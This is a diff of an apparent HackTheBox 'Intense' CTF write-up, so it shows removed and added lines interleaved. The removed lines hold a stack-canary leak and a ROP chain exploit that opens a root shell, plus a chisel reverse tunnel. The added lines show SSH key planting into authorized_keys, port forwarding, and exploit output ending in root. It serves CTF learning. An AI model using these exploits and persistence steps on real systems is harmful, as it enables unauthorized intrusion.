-7944702841627689537 found at offset: 8
+We can generate `SSH` keys to forward the port.
 ```
-
->The canary start after 8 bytes. 
-
-
-Read canary EBP and the return address 
-
-The function used to copy a note into in other offest is "memcpy":
-
+ezi0x00@kali:~/HTB/Intense$ ssh-keygen -f intense
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in intense
+Your public key has been saved in intense.pub
+The key fingerprint is:
+SHA256:3o6rs3B23pLBKTi0TvIEaQEBHqD6NMphLrPFZ+IWyfE ezi0x00@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|B+               |
+|o o              |
+|.. o             |
+|. = .            |
+|.=o* o .S.       |
+|+=*.E ..+.       |
+|+o=B+.o.oo.      |
+|.=.+o+.oo+       |
+|...   o++oo      |
++----[SHA256]-----+
+ezi0x00@kali:~/HTB/Intense$ ls -lah | grep pub
+-rw-r--r--  1 ezi0x00 ezi0x00  566 Nov 19 01:26 intense.pub
+ezi0x00@kali:~/HTB/Intense$ cat intense.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3qTAJUS5VASYHFghtp8jUCzFjE6IE2eEDy76tIYcT+8LHBBc5XG91J2SuPf70IZ3InOye7Ulft7BXCSicysFxObcfcogvZthireCYfSVKnDtRY1Eokto07uiw6DrKryTs9pjvi7NjHIrg132FSByv61qnCHKCxZnAf9a19/opN9XqiaLiiriLRY6RurBC5ZM1Hmig74uaeewj5D/yy2WnU+SZrvhMF11dQ9QCPmpKGgGe0w0xy8ww275d1Wi0Tc78rOZdYZU2dzOF7zDCS/ZLYJB+KJUmd8gUakCn7iFplbxIPvGBetbmySYfSgyhlWJE68d8SgXZxH/Rv7GDX9AGUvflPBVAWRBZoGI+AHxHaCRr7OknhHMfOfJJN7fnqVaGXfuRwYzInRv/f2o92jRRwXdG3sw5vYIvVFMAOAmyeKL/PaUSP4IrsxW5h9QYYg6HdZUDqHIz9aWyYoICQFle6qZIQgiBggRG+ubTu4nYue3rhGVQUpOQRbDYpsPpxOc= ezi0x00@kali
 ```
-void *memcpy(void *dest, const void * src, size_t n)
+[**In short, if you try to put your key in the auth file, it will be rejected because it only accepts from 0: 255 and your key is larger than that. So we will use a different algorithm called `ecdsa`.**]
+
+```shell
+zi0x00@kali:~/HTB/Intense$ ssh-keygen -t ecdsa -f intense
+Generating public/private ecdsa key pair.
+intense already exists.
+Overwrite (y/n)? y
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in intense
+Your public key has been saved in intense.pub
+The key fingerprint is:
+SHA256:h0aUj3wr5FedTVG8g+9QXSzl7ZQ7kBjhDBSwx0YKBRE ezi0x00@kali
+The key's randomart image is:
++---[ECDSA 256]---+
+|     E=o+*.o.  ==|
+|      ..* + o o.B|
+|       +.* + +.*B|
+|       .*.o ..+*+|
+|       oS..o  ooo|
+|       .o.o  . ..|
+|         o    o  |
+|               . |
+|                 |
++----[SHA256]-----+
+ezi0x00@kali:~/HTB/Intense$ cat intense.pub
+ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNcDsIVnGpMgqEwcHVp6vGgfU6E8OccBv1ei+Iz5Qm1ZNAuHq+Q7+qccqCMG4PMj65KCxKIxUHS+nEZ6NPycj0Y= ezi0x00@kali
 ```
+So the steps
+```shell
+Debian-snmp@intense:/var/lib/snmp/.ssh$ echo -n "ecdsa-sha2-nistp256" > x
 
-This function dosen't verify the presence of "\x00" end of string. and so we can put "\x00" in the payload and the function will continue copying.
-The first canary byte is always "\x00" to block any payload using a functions like "scanf()" etc which stop reading when find the "\x00".
-With the first test to know how much bytes to reach the canary block we caught 8 bytes.
+Debian-snmp@intense:/var/lib/snmp/.ssh$ cat x
 
+ecdsa-sha2-nistp256Debian-snmp@intense:/var/lib/snmp/.ssh$ echo -n ' AAAAE2VjZHNhLXNoYTItbml' >> x
+
+Debian-snmp@intense:/var/lib/snmp/.ssh$ echo -n 'zdHAyNTYAAAAIbmlzdHAyNTYAAABB' >> x
+
+Debian-snmp@intense:/var/lib/snmp/.ssh$ echo -n 'BNcDsIVnGpMgqEwcHVp6vGgfU6E8OccBv1ei' >> x
+
+Debian-snmp@intense:/var/lib/snmp/.ssh$ echo -n '+Iz5Qm1ZNAuHq+Q7+qccqCMG4PMj65KCxKIx' >> x
+
+Debian-snmp@intense:/var/lib/snmp/.ssh$ echo -n 'UHS+nEZ6NPycj0Y= ' >> x
+
+Debian-snmp@intense:/var/lib/snmp/.ssh$ cat x
+
+ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNcDsIVnGpMgqEwcHVp6vGgfU6E8OccBv1ei+Iz5Qm1ZNAuHq+Q7+qccqCMG4PMj65KCxKIxUHS+nEZ6NPycj0Y=Debian-snmp@intense:/var/lib/snmp/.ssh$
+Debian-snmp@intense:/var/lib/snmp/.ssh$ cat x >> authorized_keys
+Debian-snmp@intense:/var/lib/snmp/.ssh$
+ ```
+ ```shell
+ezi0x00@kali:~/HTB/Intense$ chmod 600 intense
+ezi0x00@kali:~/HTB/Intense$ ssh -i intense Debian-snmp@10.10.10.195
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Nov 19 00:34:46 UTC 2020
+
+  System load:  0.0               Processes:             172
+  Usage of /:   6.3% of 39.12GB   Users logged in:       0
+  Memory usage: 9%                IP address for ens160: 10.10.10.195
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+181 packages can be updated.
+130 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Thu Nov 19 00:25:59 2020 from 10.10.16.11
+Connection to 10.10.10.195 closed.
 ```
- => |          Buffer                   |          8 bytes junk        |         8 Bytes of canary    |           8 Bytes RBP            |         8 Bytes Return Address   |
+connection is closed because the shell for Debian-snmp is set to `/bin/false`:
+```shell
+Debian-snmp@intense:/var/lib/snmp/.ssh$ grep snmp /etc/passwd
+Debian-snmp:x:111:113::/var/lib/snmp:/bin/false
 ```
-
-- We place index at the end of buffer(put 1024 bytes into notes[])
-- With CMD2 we put the offset at 1024 too and tell "memcpy()" to copy 32 bytes which represent the 4 qword (qword == 64bits == 8bytes), and add 32 to index(index+=32)
-- We  overrite the buffer but we copy the same value, because "dest" and "src" offset are the same, so we overwite without throw a  smach stack error. 
-- Using the CMD3, we can write the note buffer(send to client), and read the buffer + 32bytes after the buffer (canary,EBP,RIP)
-
-Code
-
+so to get a shell
+```shell
+ezi0x00@kali:~/HTB/Intense$ ssh -i intense -N -L5001:localhost:5001 Debian-snmp@10.10.10.195
 ```
-def read_canary_ebp_rsp():
-    payload_fullbuff= put_payload_into_notebuffer()
-
-    #Now index =1024, let's use CMD2 and define offset as 1024 and use memcpy() to copy the canary rbp and rsp into the end of the node[]
-    payload_bof =copy_to_note(1024,32)    
-    # send the two payload and read the three registers
-    p = remote(args.ip,args.port)
-    p.send(payload_fullbuff)  # send the payload to put all in the note buffer
-    p.send(payload_bof)   # throw bof wiht cmd2
-
-    data= p.recv()
-    canary=u64(data[1024+8:1024+16])
-    RBP=u64(data[1024+16:1024+24])
-    RIP=u64(data[1024+24:1024+32])
-    
-    canary_formated = binascii.hexlify(struct.pack(">Q",canary)).decode() # fromated address to little endian and in hexa form 
-    RBP_formated = binascii.hexlify(struct.pack(">Q",RBP)).decode() # fromated address to little endian and in hexa form 
-    RIP_formated = binascii.hexlify(struct.pack(">Q",RIP)).decode() # fromated address to little endian and in hexa form 
-
-    print(colored("Canary: 0x%s "%canary_formated,"green"))
-    print(colored("RBP:    0x%s "%RBP_formated,"green"))
-    print(colored("RIP:    0X%s "%RIP_formated,"green"))
-    p.close()
-    return (canary,RBP,RIP)
+let's do some exploitation, Through this [**Shellcode**](https://github.com/0xN1ghtR1ngs/CTF-Scripts/blob/main/IntenseMachine-HTB/exploit_note.py) after it has reached its final form.
+first change from local to server.
 ```
+#!/usr/bin/env python3
 
-Leak libc 
+from pwn import *
 
-Now I know the memory space of the main program, but not the libc. I also know the canary and can overwrite the return address. I'll use a rop chain to leak a libc address, and then can calculate the addresses of any functions or strings in libc I want. In the program, it uses "write" to send data to the socket. I'll use a write call to send the GOT table address for the write function.
-
-Program base Address:
-
-Because PIE is enabled it means that even if my gadgets are in the main program, they still move around in memory.
-I'll use my leaked return address (RIP) to find the offset of the program base. The return address I leak will always be as the same distance from the base into that memory space. So I can simply look at that address and the memory map, and calculate the offset.
-
+context.binary = './note_server'
+e = context.binary
+libc = ELF('./libc')
+r = remote("127.0.0.1", 5001)
 ```
-gdb-peda$ x/3xg $rbp-0x8
-0x7fffffff8fb8:	0xd0fe47edd3651300	0x00007fffffff90c0
-0x7fffffff8fc8:	0X0000555555554f54
-gdb-peda$ info proc mappings
-process 31711
-Mapped address spaces:
-
-          Start Addr           End Addr       Size     Offset objfile
-      0x555555554000     0x555555556000     0x2000        0x0 /Lab/htb/Intense/note_server
-      0x555555755000     0x555555756000     0x1000     0x1000 /Lab/htb/Intense/note_server
-      0x555555756000     0x555555757000     0x1000     0x2000 /Lab/htb/Intense/note_server
-      0x555555757000     0x555555778000    0x21000        0x0 [heap]
-      0x7ffff7dd7000     0x7ffff7df9000    0x22000        0x0 /lib/x86_64-linux-gnu/libc-2.28.so
-gdb-peda$ p 0X0000555555554f54 - 0x0000555555554000
-$3 = 0xf54
+because its server need a `libc` file `Server-specific`, not local.
+```shell
+Debian-snmp@intense:/home/user$ ldd note_server
+        linux-vdso.so.1 (0x00007ffc7a3e4000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4dde41e000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007f4ddea12000)
 ```
-
-Here our return address is **0X0000555555554f54** and the and base address of program is  **0x555555554000** so the offset  **0xf54**  And because that offset is always the same. I can calculate for any run that the base address will be the leaked return address minus **0xf54**
-
-
+then download executable file and `Libc` file by: 
+```shell
+Debian-snmp@intense:/home/user$ base64 note_server > /tmp/note.b64
+Debian-snmp@intense:/lib/x86_64-linux-gnu$ base64 /lib/x86_64-linux-gnu/libc.so.6 > /tmp/libc.b64
 ```
-base_address = rip - 0xf54 # 0x caught with the (rip - base addresse) For base address gdb-peda$ vmmap and   gdb-peda$ p 0X0000555555554f54 - 0x0000555555554000
+![website](/assets/img/Posts/downexe.png)
+do it again with `libc.b64` and copy `base64` in file `note_server.b64`, `lib.b64`.
+then: 
+```shell
+ezi0x00@kali:~/HTB/Intense$ base64 -di libc.b64 > libc
+ezi0x00@kali:~/HTB/Intense$ base64 -di note_server.b64 > note_server
 ```
-
-Get Gadgets:
-
-I'll need gadgets that allow me to set rdi, rsi, and rdx, as well as the GOT address for write to leak, and the PLT address for write to call. I'll get gadgets by typing rop at the gdb-peda$ prompt:
-
-Firstly i tried to get gadgets using the python pwntools ROP class like:
-
+The decisive moment has come
+```shell
+ezi0x00@kali:~/HTB/Intense$ python3 exploit.py 
+[*] '/home/ezi0x00/HTB/Intense/note_server'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] '/home/ezi0x00/HTB/Intense/libc'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 127.0.0.1 on port 5001: Done
+[*] Stage One - Defeat ASLR
+[+] Canary: 0xc4c8d3e9f9b6d400
+[+] Return: 0x55e7e9d21f54
+[*] Stage two - Find libc
+[+] Opening connection to 127.0.0.1 on port 5001: Done
+[*] Loaded 14 cached gadgets for './note_server'
+[*] Stage Three - pwn
+[+] Opening connection to 127.0.0.1 on port 5001: Done
+[*] Loaded 198 cached gadgets for './libc'
+[*] Switching to interactive mode
+$ id 
+uid=0(root) gid=0(root) groups=0(root)
+$ cd /root
+$ ls
+root.txt
+script.sh
+$ cat root.txt
+d518c7fdb516b4ef****************
+$  
 ```
-def read_write_libc_fct_address(binary,canary,rbp,base_address):
-
-   elf= ELF(binary, checksec=False)
-   elf.address = base_address
-   rop = ROP(elf)
-   # create the rop gadgets representing : write(file_descriptot=4,write@GOT())  file_descriptor = 4 ( our client )
-   rop.write(FILE_DESCRIPTOR,elf.got['write'])
-   log.info('stage 1 ROP Chain :' + rop.dump())
-   len_rop=len(rop.chain())
-   ## try got write
-   payload_fullbuff=put_payload_into_notebuffer(canary,rbp,rop.chain(),False)
-
-   #Now index =1024, let's use CMD2 and define offset as 4 and use memcpy() to copy the canary rbp and rop into the end of the node[]
-   copy_size = 8+16+len_rop # the size of buffer to cpy
-   payload_bof =copy_to_note(4,copy_size)
-
-   # send to payload
-   p = remote(args.ip,args.port)
-   p.send(payload_fullbuff)  # send the payload to put all in the note buffer
-   p.send(payload_bof)   # throw bof wiht cmd2
-   # read the first buffer+copying data over the buffer
-   data= p.recv(1024+copy_size)
-
-   print(colored("Data Length %s"%len(data),"green"))
-   #print(colored("Data: %s"%binascii.hexlify(data),"green"))
-   write_libc_address = p.recv(8,timeout=4) # read the write() address with the rop chains. its the write address from Libc
-   write_libc_address_formed =struct.pack(">Q",u64(write_libc_address))
-   print(colored("write_plt_address Length %s"%len(write_libc_address),"green"))
-   print(colored("write_plt_address: 0x%s  "%binascii.hexlify(write_libc_address_formed).decode(),"green"))
-   p.close()
-   return u64(write_libc_address)
-
-```
-
-The GOT address will hold the address of "write" in libc as it's loaded. That's what I want to leak. The PLT is the table of code that contains the stubs to call the dynamic linker. So the first time a function is called, the GOT jump right back to the PLT which calls the linker. The linker updates the GOT so the next time it's called, it goes right to the function in libc. The PLT address will be constant relative to the program base. I finally have to find the offset of functions and gadgets etc.. and calculate the libc base address.
-
-```
-	     # readelf -s remote_libc.so | grep -e " dup2@@GLIBC" -e " execve@@GLIBC" -e " write@@GLIBC"
-              #999: 00000000001109a0    33 FUNC    WEAK   DEFAULT   13 dup2@@GLIBC_2.2.5
-              #1491: 00000000000e4e30    33 FUNC    WEAK   DEFAULT   13 execve@@GLIBC_2.2.5
-              #2246: 0000000000110140   153 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.2.5
-
-
-	     # strings -a -t x remote_libc.so | grep -i "/bin/sh"
-		# 1b3e9a /bin/sh
-
-	    #  rp-lin-x64 -f remote_libc.so --unique -r 1 | grep -i "pop rdi "
-	       # 0x0002155f: pop rdi ; ret  ;  (490 found)
-
-	    #  rp-lin-x64 -f remote_libc.so --unique -r 1 | grep -i "pop rsi"
-	       # 0x00023e6a: pop rsi ; ret  ;  (147 found)
-
-	    #  rp-lin-x64 -f remote_libc.so --unique -r 1 | grep -i "pop rdx"
-	       # 0x00001b96: pop rdx ; ret  ;  (6 found)
-
-	       write_offset_libc= 0x0000000000110140
-	       dup2_offset_libc = 0x00000000001109a0
-	       execve_offset_libc = 0x00000000000e4e30
-	       binsh_offset_libc =  0x1b3e9a
-	       pop_rdi_ret_offset = 0x0002155f
-	       pop_rsi_ret_offset = 0x00023e6a
-	       pop_rdx_ret_offset = 0x00001b96
-
-	       libc_base = write_libc_address - write_offset_libc
-	       dup2_address = p64(dup2_offset_libc + libc_base)
-	       execve_address = p64(execve_offset_libc+libc_base)
-	       binsh_address = p64(binsh_offset_libc+libc_base)   
-	       pop_rdi_ret_address = p64(pop_rdi_ret_offset +libc_base)
-	       pop_rsi_ret_address = p64(pop_rsi_ret_offset +libc_base)
-	       pop_rdx_ret_address = p64(pop_rdx_ret_offset +libc_base)
-```
-
-Putting all of that together, i have the following code:
-
-Note: 
-
->When we execute the shell with "execve("/bin/sh",0,0)" function we have to redirect the output(stdout), the input(stdin) and the error(stderr) to the client file descriptor socket.
-
-The file descriptor number for the client where the reverse shell should redirect the (stdin,stdout,sterror)
-```
-  0x0000555555554de8 <+654>:	movzx  edx,WORD PTR [rbp-0x412]
-   0x0000555555554def <+661>:	lea    rcx,[rbp-0x410]
-   0x0000555555554e29 <+655>:	mov    eax,DWORD PTR [rbp-0x424]
-   0x0000555555554e2f <+661>:	mov    rsi,rcx
-   0x0000555555554e32 <+664>:	mov    edi,eax
-   0x0000555555554e34 <+666>:	call   0x555555554980 <write@plt>
-```
-
-Here the sock == file descriptor is the first argument of the function "write(sock,note,index)". This argument is passed through the edi, and edi is the value of 'DWORD PTR [rbp-0x424]"
-
-**edi is 4bytes from [rbp-0x424]**
-
-```
-gdb-peda$ x/4b $rbp-0x424
-0x7fffffff8b9c:	0x04	0x00	0x00	0x00
-```
-
-```
-  # create payloads
-       # first rop chains to execute: dup2(FILE_DESCRIPTOR,1) 
-       # in asm:
-        #pop rdi, ret # set the arg1 (File_DESCRIPTOR==4)
-        #pop rsi, ret # set arg2      (stdout=1)
-        #call dup2(4,1) redirect stout
-       payload_dup2=pop_rdi_ret_address
-       payload_dup2+=p64(FILE_DESCRIPTOR)
-       payload_dup2+=pop_rsi_ret_address
-       payload_dup2+=p64(1)
-       payload_dup2+=dup2_address
-        #call dup2(4,0) redirect stdin
-       payload_dup2+=pop_rdi_ret_address
-       payload_dup2+=p64(FILE_DESCRIPTOR)
-       payload_dup2+=pop_rsi_ret_address
-       payload_dup2+=p64(0)
-       payload_dup2+=dup2_address
-        #call dup2(4,2) redirect stderror
-       payload_dup2+=pop_rdi_ret_address
-       payload_dup2+=p64(FILE_DESCRIPTOR)
-       payload_dup2+=pop_rsi_ret_address
-       payload_dup2+=p64(2)
-       payload_dup2+=dup2_address
-       
-       # second ropchains to execve("/bin/sh",0,0)
-       # in asm:
-        #pop rdi, ret # set the arg1 ("/bin/sh" address)
-        #pop rsi, ret # set arg2      (0)
-        #pop rdx, ret # set arg3      (0)
-        #call execve
-       payload_execve=pop_rdi_ret_address
-       payload_execve+=binsh_address
-       payload_execve+=pop_rsi_ret_address
-       payload_execve+=p64(0)
-       payload_execve+=pop_rdx_ret_address
-       payload_execve+=p64(0)
-       payload_execve+=execve_address
-       # Final payload
-       final_payload= payload_dup2 +payload_execve
-```
-
-I created a python script which exploit the binary locally using the same binary with same debugging modification, and the local libc, and also with the remote binary.
-
-Note:
->The server run locally so i had to use chisel to forward the port 5001, in my machine :
-
-```
-ezi0x00@kali:~/HTB/Intense$ ./chisel client --max-retry-count 1  10.10.14.X:8000 R:5001:127.0.0.1:5001
-```
-And i can see the port 5001 listening  in my machine :
-
-```
-ezi0x00@kali:~/HTB/Intense$ lsof -ni :5001         
-COMMAND  PID    USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME
-chisel  6499 user    6u  IPv4 10349808      0t0  TCP *:5001 (LISTEN)
-```
-
-[**code**](https://github/0xN1ghtR1ngs)
-```
-$ python3 root.py -i 127.0.0.1 -p 5001
-```
-![website](/assets/img/Posts/root-flag.png)
 
 And we pwned the Box !
 
 Thanks for reading, Suggestions & Feedback are appreciated !
-
